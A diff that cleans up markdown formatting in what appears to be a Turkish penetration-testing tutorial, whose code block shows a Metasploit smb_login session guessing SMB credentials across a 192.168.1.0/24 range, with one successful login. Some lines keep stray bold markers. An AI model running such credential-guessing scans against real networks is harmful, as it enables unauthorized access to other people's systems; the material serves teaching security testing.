@@ -35,13 +35,13 @@ Yaptığınız `smb_login` taramasında başarılı bir oturum açma gerçekleş
 
 ```bash
 msf > use auxiliary/scanner/smb/smb_login
-msf auxiliary**(**smb_login**)** > show options
+msf auxiliary(smb_login) > show options
 
-Module options **(**auxiliary/scanner/smb/smb_login**)**:
+Module options (auxiliary/scanner/smb/smb_login):
 
    Name              Current Setting  Required  Description
    ----              ---------------  --------  -----------
-   BLANK_PASSWORDS   true             no        Try blank passwords **for **all users
+   BLANK_PASSWORDS   true             no        Try blank passwords for **all users
    BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
    PASS_FILE                          no        File containing passwords, one per line
    PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
@@ -50,31 +50,31 @@ Module options **(**auxiliary/scanner/smb/smb_login**)**:
    SMBDomain         WORKGROUP        no        SMB Domain
    SMBPass                            no        SMB Password
    SMBUser                            no        SMB Username
-   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works **for **a host
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for **a host
    THREADS           1                yes       The number of concurrent threads
    USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
-   USER_AS_PASS      true             no        Try the username as the password **for **all users
+   USER_AS_PASS      true             no        Try the username as the password for **all users
    USER_FILE                          no        File containing usernames, one per line
-   VERBOSE           true             yes       Whether to print output **for **all attempts
+   VERBOSE           true             yes       Whether to print output for **all attempts
 
-msf auxiliary**(**smb_login**)** > set RHOSTS 192.168.1.0/24
-RHOSTS **=>** 192.168.1.0/24
-msf auxiliary**(**smb_login**)** > set SMBUser victim
-SMBUser **=>** victim
-msf auxiliary**(**smb_login**)** > set SMBPass s3cr3t
-SMBPass **=>** s3cr3t
-msf auxiliary**(**smb_login**)** > set THREADS 50
-THREADS **=>** 50
-msf auxiliary**(**smb_login**)** > run
+msf auxiliary(smb_login) > set RHOSTS 192.168.1.0/24
+RHOSTS => 192.168.1.0/24
+msf auxiliary(smb_login) > set SMBUser victim
+SMBUser => victim
+msf auxiliary(smb_login) > set SMBPass s3cr3t
+SMBPass => s3cr3t
+msf auxiliary(smb_login) > set THREADS 50
+THREADS => 50
+msf auxiliary(smb_login) > run
 
 > 192.168.1.100 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
 > 192.168.1.111 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
 > 192.168.1.114 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
 > 192.168.1.125 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
-> 192.168.1.116 - SUCCESSFUL LOGIN **(**Unix**)**
+> 192.168.1.116 - SUCCESSFUL LOGIN (Unix)
 > Auxiliary module execution completed
 
-msf auxiliary**(**smb_login**)** >
+msf auxiliary(smb_login) >
 ```
 
 
